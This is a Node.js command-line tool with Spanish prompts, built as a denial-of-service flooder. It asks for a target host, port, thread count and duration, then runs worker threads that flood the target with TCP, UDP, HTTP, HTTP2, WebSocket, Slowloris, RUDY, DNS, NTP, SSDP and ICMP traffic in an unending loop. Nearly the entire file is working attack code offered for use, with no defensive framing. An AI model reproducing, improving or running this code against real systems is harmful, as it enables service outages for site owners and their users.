#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const raw = require('raw-socket');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const url = require('url');
const dns = require('dns/promises');

class DDoSAttack {
  constructor() {
    this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0, start: 0 };
    this.config = {
      workers: [],
      anim: ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏'],
      methods: [
        'TCP','UDP','HTTP','HTTPS','HTTP2','WEBSOCKET','SLOWLORIS',
        'DNS','NTP','SSDP','ICMP','RUDY'
      ]
    };
    this.running = false;
  }

  async init() {
    const targetInput = await this.ask(chalk.greenBright('IP/URL objetivo: '));
    const parsed = await this.parseTarget(targetInput);

    this.target = parsed.hostname;
    this.port = parsed.port;
    this.resolvedIP = await this.resolveTarget(this.target);

    if (net.isIP(this.target) && !parsed.hasPort) {
      const portInput = await this.ask(chalk.greenBright('Puerto: ')) || '80';
      this.port = parseInt(portInput, 10);
    }

    this.threads = Math.min(
      parseInt(await this.ask(chalk.greenBright('Hilos (50-500): ')) || 100, 10),
      500
    );

    this.duration = Math.min(
      parseInt(await this.ask(chalk.greenBright('Duración (segundos): ')) || 60, 10),
      3600
    );

    this.selectedMethods = await this.selectMethods();
    this.generatePayloads();
    this.showAttackSummary();
    this.start();
  }

  async parseTarget(input) {
    try {
      const original = input;
      if (!input.startsWith('http')) input = `http://${input}`;
      const parsed = new url.URL(input);
      const hasPort = original.includes(':') && !!parsed.port;
      return {
        hostname: parsed.hostname,
        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
        hasPort
      };
    } catch {
      console.log(chalk.red('Formato inválido'));
      process.exit(1);
    }
  }

  async resolveTarget(host) {
    if (net.isIP(host)) return host;
    try {
      const { address } = await dns.lookup(host);
      console.log(chalk.yellow(`Resolución DNS: ${host} => ${address}`));
      return address;
    } catch {
      console.log(chalk.red('Error DNS'));
      process.exit(1);
    }
  }

  async selectMethods() {
    const prompt =
      chalk.greenBright('Métodos disponibles:\n') +
      chalk.yellow(this.config.methods.join(', ') + '\n') +
      chalk.greenBright('Métodos (separar por coma) [Enter para todos]: ');
    const answer = await this.ask(prompt);
    if (!answer) return this.config.methods;
    return answer.toUpperCase().split(',').map(m => m.trim()).filter(Boolean);
  }

  generatePayloads() {
    const make = size => { const buf = Buffer.alloc(size); randomFillSync(buf); return buf; };

    this.payloads = {
      tcp: make(1024),
      udp: make(65507),
      http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${this.target}\r\n\r\n`,
      dns: this.createDnsPacket(),
      ntp: Buffer.from([0x1B, ...Buffer.alloc(47)]),
      ssdp: Buffer.from(
        'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\n' +
        'MAN:"ssdp:discover"\r\nMX:1\r\nST:ssdp:all\r\n\r\n'
      ),
      rudy: Buffer.from(
        'POST / HTTP/1.1\r\nContent-Length:1000000\r\n\r\n'
      )
    };
  }

  createDnsPacket() {
    const domain = randomBytes(8).toString('hex') + '.com';
    return Buffer.from([
      0xAA,0xAA,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
      domain.length, ...Buffer.from(domain), 0x00,0x00,0x01,0x00,0x01
    ]);
  }

  showAttackSummary() {
    console.log(chalk.cyanBright('\nConfiguración:'));
    console.log(chalk.yellow(`Objetivo: ${this.target}:${this.port}`));
    console.log(chalk.yellow(`Duración: ${this.duration}s`));
    console.log(chalk.yellow(`Hilos: ${this.threads}`));
    console.log(chalk.yellow(`Métodos: ${this.selectedMethods.join(', ')}`));
    console.log();
  }

  start() {
    this.running = true;
    this.stats.start = performance.now();
    console.log(chalk.green('Iniciando ataque...'));
    this.launchWorkers();
    this.showStats();
    setTimeout(() => this.stop(), this.duration * 1000);
  }

  launchWorkers() {
    const cores = Math.min(require('os').cpus().length, 16);
    const perWorker = Math.ceil(this.threads / cores);
    for (let i = 0; i < cores; i++) {
      const worker = new Worker(__filename, {
        workerData: {
          target: this.resolvedIP,
          port: this.port,
          payloads: this.payloads,
          methods: this.selectedMethods,
          threads: perWorker,
          hostHeader: this.target
        }
      });
      worker.on('message', msg => this.updateStats(msg));
      worker.on('error', err => console.error(chalk.red(`Worker Error: ${err.message}`)));
      this.config.workers.push(worker);
    }
  }

  updateStats({ total, success, failed, bw }) {
    this.stats.total += total;
    this.stats.success += success;
    this.stats.failed += failed;
    this.stats.bandwidth += bw;
  }

  showStats() {
    if (!this.running) return;
    const elapsed = (performance.now() - this.stats.start) / 1000;
    const frame = this.config.anim[Math.floor(elapsed * 10) % 10];
    const rps = (this.stats.total / elapsed || 0).toFixed(0);
    const bwGB = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
    process.stdout.write(
      chalk`\r{green ${frame}} ` +
      `T:{greenBright ${elapsed.toFixed(1)}s} ` +
      `Req:{cyan ${this.stats.total}} ` +
      `SPS:{cyan ${rps}} ` +
      `BW:{cyan ${bwGB}GB} ` +
      `({green ${this.stats.success}}|{red ${this.stats.failed}})`
    );
    setTimeout(() => this.showStats(), 100);
  }

  stop() {
    this.running = false;
    this.config.workers.forEach(w => w.terminate());
    console.log(chalk.yellow('\nAtaque detenido\n'));
    process.exit();
  }

  ask(prompt) {
    return new Promise(resolve => {
      const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
      rl.question(prompt, answer => { rl.close(); resolve(answer); });
    });
  }
}

if (isMainThread) {
  new DDoSAttack().init();
} else {
  // Worker thread
  const { target, port, payloads, methods, threads, hostHeader } = workerData;
  const icmpSocket = raw.createSocket({
    protocol: raw.Protocol.ICMP,
    generateChecksums: true,
    checksumOffset: 2
  });
  
  const attackMethods = {
    TCP: () => {
      const s = new net.Socket();
      s.connect(port, target, () => {
        s.write(payloads.tcp);
        report('success', payloads.tcp.length);
        s.destroy();
      }).on('error', () => report('failed', 0));
    },

    UDP: () => {
      const s = dgram.createSocket('udp4');
      s.send(payloads.udp, port, target, err => {
        err ? report('failed', 0) : report('success', payloads.udp.length);
        s.close();
      });
    },

    HTTP: () => {
      const req = http.request({ hostname: target, port, headers: { Host: hostHeader } }, res => {
        report('success', 0);
        req.end();
      });
      req.on('error', () => report('failed', 0));
    },

    HTTPS: () => {
      const req = https.request({ hostname: target, port, rejectUnauthorized: false, headers: { Host: hostHeader } }, res => {
        report('success', 0);
        req.end();
      });
      req.on('error', () => report('failed', 0));
    },

    HTTP2: () => {
      const c = http2.connect(`https://${target}:${port}`, { rejectUnauthorized: false });
      c.on('error', () => report('failed', 0));
      const r = c.request({ ':path': '/', ':authority': hostHeader });
      r.on('end', () => { report('success', 0); c.close(); });
      r.end();
    },

    WEBSOCKET: () => {
      const ws = new WebSocket(`ws://${target}:${port}`, { headers: { Host: hostHeader } });
      ws.on('open', () => {
        ws.send(payloads.tcp);
        report('success', payloads.tcp.length);
        ws.close();
      }).on('error', () => report('failed', 0));
    },

    SLOWLORIS: () => {
      const s = net.connect(port, target);
      s.write(`GET / HTTP/1.1\r\nHost: ${hostHeader}\r\n`);
      setInterval(() => s.write(`X-${randomBytes(2).toString('hex')}: ${Math.random()}\r\n`), 10000);
    },

    DNS: () => {
      const s = dgram.createSocket('udp4');
      s.send(payloads.dns, port, target, err => {
        err ? report('failed', 0) : report('success', payloads.dns.length);
        s.close();
      });
    },

    NTP: () => {
      const s = dgram.createSocket('udp4');
      s.send(payloads.ntp, port, target, err => {
        err ? report('failed', 0) : report('success', payloads.ntp.length);
        s.close();
      });
    },

    SSDP: () => {
      const s = dgram.createSocket('udp4');
      s.send(payloads.ssdp, port, target, err => {
        err ? report('failed', 0) : report('success', payloads.ssdp.length);
        s.close();
      });
    },

    ICMP: () => {
      const buf = Buffer.alloc(64);
      buf.writeUInt8(8, 0); // Echo Request
      icmpSocket.send(buf, 0, buf.length, target, err => {
        err ? report('failed', 0) : report('success', buf.length);
      });
    },

    RUDY: () => {
      const s = net.connect(port, target, () => {
        s.write(payloads.rudy);
        (function slow() {
          if (s.writable) {
            s.write(`${randomBytes(2).toString('hex')}=`);
            setTimeout(slow, 500);
          }
        })();
      }).on('error', () => report('failed', 0));
    }
  };

  function report(type, bw) {
    parentPort.postMessage({ total: 1, success: type==='success'?1:0, failed: type==='failed'?1:0, bw });
  }

  (function floodLoop() {
    methods.forEach(m => {
      try { attackMethods[m](); attackMethods[m](); } catch {}
    });
    setImmediate(floodLoop);
  })();
}
